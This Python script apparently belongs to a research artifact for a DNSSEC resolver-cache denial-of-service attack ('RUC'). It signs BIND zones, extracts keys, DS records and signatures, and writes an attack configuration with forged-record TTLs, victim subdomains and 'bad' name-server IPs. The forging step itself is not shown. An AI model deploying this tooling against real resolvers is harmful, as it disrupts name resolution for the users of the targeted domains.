import os
import json
import time
import argparse
import calendar
from datetime import datetime

with open('config.json') as f:
    config_dict=json.load(f)

# !!! The original TTL of the victim domain !!!
GOOD_TTL=config_dict['record_ttl']['good']

# !!! The manipulated TTL for forged records (to extend the DoS duration of RUC) !!!
BAD_TTL=config_dict['record_ttl']['bad']

def dnssec_signzone(domain):
    os.system(f'dnssec-signzone -K /etc/bind/dnssec_keys -o {domain} /etc/bind/db.{domain}')
    print(f'dnssec-signzone done: {domain}')
    os.system(f'rm dsset-{domain}.')

def dnssec_signzones(ruc_domain_list):
    for ruc_domain in ruc_domain_list:
        dnssec_signzone(ruc_domain)

def get_sigtime(time_str):
    return int(calendar.timegm(time.strptime(time_str+'UTC',"%Y%m%d%H%M%S%Z")))

def get_rrsig(content):
    lines=content.split('\n')
    rrsig_str=''
    for line in lines:
        rrsig_str=rrsig_str+line.strip()
    rrsig_str_new=''
    for i,c in enumerate(rrsig_str,1):
        rrsig_str_new=rrsig_str_new+c
        if i%56==0:
            rrsig_str_new=rrsig_str_new+' '
    return rrsig_str_new

def get_dnskey_rrsig(domain,tag_zsk,tag_ksk):
    f=open('/etc/bind/db.'+domain+'.signed')
    lines=f.readlines()
    f.close()

    zsk_idx=0
    ksk_idx=0
    sig_idx=0
    for idx in range(len(lines)):
        line=lines[idx]
        if ('RRSIG' in line) and ('DNSKEY' in line):
            if (str(tag_zsk) in lines[idx+1]):
                sig_idx=idx+1
                zsk_idx=idx+2
            elif (str(tag_ksk) in lines[idx+1]):
                ksk_idx=idx+2

    rrsig_zsk=''
    while zsk_idx!=0:
        rrsig_zsk=rrsig_zsk+lines[zsk_idx]
        if ')' in lines[zsk_idx]:
            zsk_idx=0
        else:
            zsk_idx+=1
    rrsig_zsk=rrsig_zsk.replace(')','')

    rrsig_ksk=''
    while ksk_idx!=0:
        rrsig_ksk=rrsig_ksk+lines[ksk_idx]
        if ')' in lines[ksk_idx]:
            ksk_idx=0
        else:
            ksk_idx+=1
    rrsig_ksk=rrsig_ksk.replace(')','')

    rrsig_zsk=get_rrsig(rrsig_zsk)
    rrsig_ksk=get_rrsig(rrsig_ksk)
    sigtime_str=lines[sig_idx].replace('\t','')
    sigtime_segs=sigtime_str.split(' ')
    sig_inc_time=get_sigtime(sigtime_segs[1])
    sig_exp_time=get_sigtime(sigtime_segs[0])

    return rrsig_zsk,rrsig_ksk,sig_inc_time,sig_exp_time

def get_rtype_rrsig(rtype,apex_domain,target_domain):
    f=open('/etc/bind/db.'+apex_domain+'.signed')
    lines=f.readlines()
    f.close()

    rtype_idx=0
    for idx in range(len(lines)):
        line=lines[idx]
        line_segs=line.split('\t')
        if line_segs[0].startswith(target_domain):
            cur_idx=idx+1
            cur_line=lines[cur_idx]
            cur_line_segs=cur_line.split('\t')
            while cur_line_segs[0]=='' and cur_idx+1<len(lines):
                if ('RRSIG' in cur_line) and (rtype in cur_line) and ('(' in cur_line):
                    rtype_idx=cur_idx+2
                cur_idx+=1
                cur_line=lines[cur_idx]
                cur_line_segs=cur_line.split('\t')

    rrsig_rtype=''
    while rtype_idx!=0:
        rrsig_rtype=rrsig_rtype+lines[rtype_idx]
        if ')' in lines[rtype_idx]:
            rtype_idx=0
        else:
            rtype_idx+=1
    rrsig_rtype=rrsig_rtype.replace(')','')
    rrsig_rtype=get_rrsig(rrsig_rtype)

    return rrsig_rtype

def clean_rr_str(rr_segs_raw):
    rr_segs=list()
    for seg in rr_segs_raw:
        if seg=='':
            continue
        rr_segs.append(seg)
    return rr_segs

def get_dnskey(apex):
    f=open('/etc/bind/db.'+apex)
    lines=f.readlines()
    f.close()
    zsk=''
    ksk=''
    alg_zsk=-1
    alg_ksk=-1
    for line in lines:
        rr_segs=clean_rr_str(line.split(' '))
        if len(rr_segs)<3:
            continue
        if rr_segs[2]=='DNSKEY':
            if rr_segs[3]=='256':
                alg_zsk=int(rr_segs[5])
                for seg in rr_segs[6:]:
                    zsk=zsk+seg+' '
            elif rr_segs[3]=='257':
                alg_ksk=int(rr_segs[5])
                for seg in rr_segs[6:]:
                    ksk=ksk+seg+' '
    zsk=zsk[:-1]
    ksk=ksk[:-1]

    f=open('/etc/bind/db.'+apex+'.signed')
    lines=f.readlines()
    f.close()
    tag_zsk=-1
    tag_ksk=-1
    for line in lines:
        if 'ZSK;' in line:
            line=line.strip()
            keytag_segs=line.split('=')
            tag_zsk=int(keytag_segs[-1].replace(' ',''))
        elif 'KSK;' in line:
            line=line.strip()
            keytag_segs=line.split('=')
            tag_ksk=int(keytag_segs[-1].replace(' ',''))
    return zsk,ksk,tag_zsk,tag_ksk,alg_zsk,alg_ksk

def get_ds(sub,apex):
    f=open('/etc/bind/db.'+apex)
    lines=f.readlines()
    f.close()
    tag_ds=-1
    alg_ds=-1
    hash_ds=-1
    digest=''
    for line in lines:
        rr_segs=clean_rr_str(line.split(' '))
        if len(rr_segs)<3:
            continue
        if rr_segs[0]==sub and rr_segs[2]=='DS':
            tag_ds=int(rr_segs[3])
            alg_ds=int(rr_segs[4])
            hash_ds=int(rr_segs[5])
            for seg in rr_segs[6:]:
                digest=digest+seg
    return tag_ds,alg_ds,hash_ds,digest

def config_main(apex_zone):
    if apex_zone=='dnssec-ruc-ms.xyz':
        resolver_os='windows'
    else:
        resolver_os='linux'
    
    victim_test=config_dict['subdomains']['test']+'.'+apex_zone
    victim_rucdnskey=config_dict['subdomains']['ruc_dnskey']+'.'+apex_zone
    victim_rucds=config_dict['subdomains']['ruc_ds']+'.'+apex_zone
    victim_rucds_apex=config_dict['subdomains']['ruc_ds_apex']+'.'+apex_zone
    victim_rucnsip=config_dict['subdomains']['ruc_nsip']+'.'+apex_zone
    victim_rucnsip_nsdom=config_dict['subdomains']['ruc_nsip_nsdom']+'.'+apex_zone
    victim_rucedns0=config_dict['subdomains']['ruc_edns0']+'.'+apex_zone

    nsip=config_dict['nsip'][resolver_os]['good']
    nsip_bad=config_dict['nsip'][resolver_os]['bad']

    dnssec_signzones([victim_test, victim_rucdnskey, victim_rucds, victim_rucds_apex, victim_rucnsip, victim_rucnsip_nsdom, victim_rucedns0])

    now = datetime.now()
    timestamp = now.strftime("%Y%m%d")

    zsk_rucdnskey,ksk_rucdnskey,tag_zsk_rucdnskey,tag_ksk_rucdnskey,alg_zsk_rucdnskey,alg_ksk_rucdnskey=get_dnskey(victim_rucdnskey)
    rrsig_zsk_rucdnskey,rrsig_ksk_rucdnskey,sig_inc_time_rucdnskey,sig_exp_time_rucdnskey=get_dnskey_rrsig(victim_rucdnskey,tag_zsk_rucdnskey,tag_ksk_rucdnskey)

    zsk_rucds_apex,ksk_rucds_apex,tag_zsk_rucds_apex,tag_ksk_rucds_apex,alg_zsk_rucds_apex,alg_ksk_rucds_apex=get_dnskey(victim_rucds_apex)
    tag_ds_rucds,alg_ds_rucds,hash_ds_rucds,ds_rucds=get_ds(victim_rucds.replace('.'+victim_rucds_apex,''),victim_rucds_apex)
    rrsig_zsk_rucds_apex,rrsig_ksk_rucds_apex,sig_inc_time_rucds_apex,sig_exp_time_rucds_apex=get_dnskey_rrsig(victim_rucds_apex,tag_zsk_rucds_apex,tag_ksk_rucds_apex)
    rrsig_ds_rucds=get_rtype_rrsig('DS',victim_rucds_apex,victim_rucds)

    zsk_rucnsip_nsdom,ksk_rucnsip_nsdom,tag_zsk_rucnsip_nsdom,tag_ksk_rucnsip_nsdom,alg_zsk_rucnsip_nsdom,alg_ksk_rucnsip_nsdom=get_dnskey(victim_rucnsip_nsdom)
    rrsig_zsk_rucnsip_nsdom,rrsig_ksk_rucnsip_nsdom,sig_inc_time_rucnsip_nsdom,sig_exp_time_rucnsip_nsdom=get_dnskey_rrsig(victim_rucnsip_nsdom,tag_zsk_rucnsip_nsdom,tag_ksk_rucnsip_nsdom)

    zsk_rucedns0,ksk_rucedns0,tag_zsk_rucedns0,tag_ksk_rucedns0,alg_zsk_rucedns0,alg_ksk_rucedns0=get_dnskey(victim_rucedns0)
    rrsig_zsk_rucedns0,rrsig_ksk_rucedns0,sig_inc_time_rucedns0,sig_exp_time_rucedns0=get_dnskey_rrsig(victim_rucedns0,tag_zsk_rucedns0,tag_ksk_rucedns0)
    rrsig_soa_rucedns0=get_rtype_rrsig('SOA',victim_rucedns0,victim_rucedns0)
    rrsig_nsec_rucedns0=get_rtype_rrsig('NSEC',victim_rucedns0,victim_rucedns0)

    subdomain_config_dict={
        victim_rucdnskey+'.':{
            'TIMESTAMP':timestamp,
            'NSIP':nsip,
            'GOOD_TTL':GOOD_TTL,
            'BAD_TTL':BAD_TTL,
            'SIGTIME':{
                'SIG_INC':sig_inc_time_rucdnskey,
                'SIG_EXP':sig_exp_time_rucdnskey
            },
            'ZSK':{
                'KEY':zsk_rucdnskey.replace('\n',''),
                'RRSIG':rrsig_zsk_rucdnskey.replace('\n',''),
                'TAG':tag_zsk_rucdnskey,
                'ALG':alg_zsk_rucdnskey
            },
            'KSK':{
                'KEY':ksk_rucdnskey.replace('\n',''),
                'RRSIG':rrsig_ksk_rucdnskey.replace('\n',''),
                'TAG':tag_ksk_rucdnskey,
                'ALG':alg_ksk_rucdnskey
            }
        },
        victim_rucds_apex+'.':{
            'TIMESTAMP':timestamp,
            'NSIP':nsip,
            'GOOD_TTL':GOOD_TTL,
            'BAD_TTL':BAD_TTL,
            'SIGTIME':{
                'SIG_INC':sig_inc_time_rucds_apex,
                'SIG_EXP':sig_exp_time_rucds_apex
            },
            'ZSK':{
                'KEY':zsk_rucds_apex.replace('\n',''),
                'RRSIG':rrsig_zsk_rucds_apex.replace('\n',''),
                'TAG':tag_zsk_rucds_apex,
                'ALG':alg_zsk_rucds_apex
            },
            'KSK':{
                'KEY':ksk_rucds_apex.replace('\n',''),
                'RRSIG':rrsig_ksk_rucds_apex.replace('\n',''),
                'TAG':tag_ksk_rucds_apex,
                'ALG':alg_ksk_rucds_apex
            },
            'SUB_DS':{
                'DIGEST':ds_rucds.replace('\n',''),
                'TAG':tag_ds_rucds,
                'ALG':alg_ds_rucds,
                'HASH':hash_ds_rucds,
                'RRSIG':rrsig_ds_rucds.replace('\n','')
            }
        },
        victim_rucnsip_nsdom+'.':{
            'TIMESTAMP':timestamp,
            'NSIP':nsip,
            'NSIP_BAD':nsip_bad,
            'GOOD_TTL':GOOD_TTL,
            'BAD_TTL':BAD_TTL,
            'SIGTIME':{
                'SIG_INC':sig_inc_time_rucnsip_nsdom,
                'SIG_EXP':sig_exp_time_rucnsip_nsdom
            },
            'ZSK':{
                'KEY':zsk_rucnsip_nsdom.replace('\n',''),
                'RRSIG':rrsig_zsk_rucnsip_nsdom.replace('\n',''),
                'TAG':tag_zsk_rucnsip_nsdom,
                'ALG':alg_zsk_rucnsip_nsdom
            },
            'KSK':{
                'KEY':ksk_rucnsip_nsdom.replace('\n',''),
                'RRSIG':rrsig_ksk_rucnsip_nsdom.replace('\n',''),
                'TAG':tag_ksk_rucnsip_nsdom,
                'ALG':alg_ksk_rucnsip_nsdom
            },
        },
        victim_rucedns0+'.':{
            'TIMESTAMP':timestamp,
            'NSIP':nsip,
            'GOOD_TTL':GOOD_TTL,
            'BAD_TTL':BAD_TTL,
            'SIGTIME':{
                'SIG_INC':sig_inc_time_rucedns0,
                'SIG_EXP':sig_exp_time_rucedns0
            },
            'ZSK':{
                'KEY':zsk_rucedns0.replace('\n',''),
                'RRSIG':rrsig_zsk_rucedns0.replace('\n',''),
                'TAG':tag_zsk_rucedns0,
                'ALG':alg_zsk_rucedns0
            },
            'KSK':{
                'KEY':ksk_rucedns0.replace('\n',''),
                'RRSIG':rrsig_ksk_rucedns0.replace('\n',''),
                'TAG':tag_ksk_rucedns0,
                'ALG':alg_ksk_rucedns0
            },
            'RRSIG_SOA':rrsig_soa_rucedns0.replace('\n',''),
            'RRSIG_NSEC':rrsig_nsec_rucedns0.replace('\n','')
        },
        "nameserver_threads":config_dict['attack_api']['nameserver_threads'],
        "subdomains":config_dict['subdomains']
    }
    with open('config_subdomains.json','w') as f:
        json.dump(subdomain_config_dict,f)
    os.system('service named restart')
    print('Update attack configuration, done.')

if __name__=='__main__':
    parser=argparse.ArgumentParser()
    parser.add_argument('--apex_zone',required=True)
    args=parser.parse_args()

    config_main(args.apex_zone)
    